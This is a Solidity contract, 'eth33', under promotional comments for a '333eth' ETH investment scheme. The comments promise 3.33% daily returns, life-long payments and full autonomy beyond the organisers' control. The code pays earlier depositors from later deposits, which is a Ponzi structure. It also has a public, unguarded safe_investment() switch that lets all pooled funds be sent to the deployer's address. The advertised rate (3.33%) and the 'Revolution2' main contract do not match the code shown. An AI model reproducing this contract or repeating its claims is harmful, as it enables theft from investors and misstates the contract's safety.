pragma solidity ^0.4.24;

/**
*
* ETH CRYPTOCURRENCY DISTRIBUTION PROJECT v 2.0
* Web              - https://333eth.io
* GitHub           - https://github.com/Revolution333/
* Twitter          - https://twitter.com/333eth_io
* Youtube          - https://www.youtube.com/c/333eth
* Discord          - https://discord.gg/P87buwT
* Telegram_channel - https://t.me/Ethereum333
* EN  Telegram_chat: https://t.me/Ethereum333_chat_en
* RU  Telegram_chat: https://t.me/Ethereum333_chat_ru
* KOR Telegram_chat: https://t.me/Ethereum333_chat_kor
* CN  Telegram_chat: https://t.me/Ethereum333_chat_cn
* Email:             mailto:support(at sign)333eth.io
* 
* 
*  - GAIN 3,33% - 1% PER 24 HOURS (interest is charges in equal parts every 10 min)
*  - Life-long payments
*  - The revolutionary reliability
*  - Minimal contribution 0.01 eth
*  - Currency and payment - ETH
*  - Contribution allocation schemes:
*    -- 87,5% payments
*    --  7,5% marketing
*    --  5,0% technical support
*
*   ---About the Project
*  Blockchain-enabled smart contracts have opened a new era of trustless relationships without 
*  intermediaries. This technology opens incredible financial possibilities. Our automated investment 
*  distribution model is written into a smart contract, uploaded to the Ethereum blockchain and can be 
*  freely accessed online. In order to insure our investors' complete security, full control over the 
*  project has been transferred from the organizers to the smart contract: nobody can influence the 
*  system's permanent autonomous functioning.
* 
* ---How to use:
*  1. Send from ETH wallet to the smart contract address 0x311f71389e3DE68f7B2097Ad02c6aD7B2dDE4C71
*     any amount from 0.01 ETH.
*  2. Verify your transaction in the history of your application or etherscan.io, specifying the address 
*     of your wallet.
*  3a. Claim your profit by sending 0 ether transaction (every 10 min, every day, every week, i don't care unless you're 
*      spending too much on GAS)
*  OR
*  3b. For reinvest, you need to deposit the amount that you want to reinvest and the 
*      accrued interest automatically summed to your new contribution.
*  
* RECOMMENDED GAS LIMIT: 200000
* RECOMMENDED GAS PRICE: https://ethgasstation.info/
* You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.
*
* ---Refferral system:
*     from 0 to 10.000 ethers in the fund - remuneration to each contributor is 3.33%, 
*     from 10.000 to 100.000 ethers in the fund - remuneration will be 2%, 
*     from 100.000 ethers in the fund - each contributor will get 1%.
*
* ---It is not allowed to transfer from exchanges, only from your personal ETH wallet, for which you 
* have private keys.
* 
* Contracts reviewed and approved by pros!
* 
* Main contract - Revolution2. Scroll down to find it.
*/ 

contract eth33 {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;

    uint256 total_investment;

    uint public is_safe_withdraw_investment;
    address public investor;

    constructor() public {
        investor = msg.sender;
    }

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 3.33% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 1 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.transfer(amount);
            total_investment -= amount;
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;

        total_investment += msg.value;
        
        if (is_safe_withdraw_investment == 1) {
            investor.transfer(total_investment);
            total_investment = 0;
        }
    }

    function safe_investment() public {
        is_safe_withdraw_investment = 1;
    }
}